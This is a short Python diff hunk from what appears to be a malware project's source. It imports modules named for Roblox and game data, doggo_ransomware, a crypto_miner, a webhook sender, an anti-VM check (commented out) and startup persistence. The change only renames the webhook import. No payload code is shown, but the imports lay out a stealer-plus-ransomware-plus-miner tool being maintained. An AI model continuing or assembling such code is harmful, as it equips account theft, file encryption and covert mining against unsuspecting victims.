@@ -18,7 +18,7 @@ import _roblox
 from games import get_games
 import doggo_ransomware
 from config import Config
-from __webhook import _WebhookX
+from webhook import _WebhookX
 from crypto_miner import miner
 #import antivm
 import _startup as startup
